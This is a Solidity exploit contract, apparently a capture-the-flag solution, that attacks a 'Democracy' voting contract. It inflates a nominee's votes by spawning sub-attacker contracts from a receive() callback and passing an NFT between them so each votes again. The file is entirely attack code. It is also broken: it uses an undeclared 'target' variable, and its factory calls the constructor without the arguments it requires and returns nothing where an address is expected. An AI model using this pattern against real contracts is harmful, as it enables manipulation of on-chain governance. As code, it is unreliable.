// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "./Democracy.sol";

contract DemocracyAttacker is IERC721Receiver {
    Democracy democracy;
    DemocracyAttackerFactory factory;
    address nominee;

    constructor(Democracy _democracy, address _nominee, address _factory) {
        democracy = _democracy;
        nominee = _nominee;
        factory = DemocracyAttackerFactory(_factory);
    }

    function attack() public {
        democracy.vote(nominee);
    }

    function createSubAttacker() public returns (address) {
        return factory.createAttacker();
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {
        if (democracy.votes(nominee) < 6) {
            address subAttacker = createSubAttacker();
            bytes memory empty;
            target.safeTransferFrom(address(this), subAttacker, 0, empty);
            DemocracyAttacker(payable(subAttacker)).attack();
        }
    }
}

contract DemocracyAttackerFactory {
    DemocracyAttacker public attacker;

    function createAttacker() public {
        attacker = new DemocracyAttacker();
    }
}
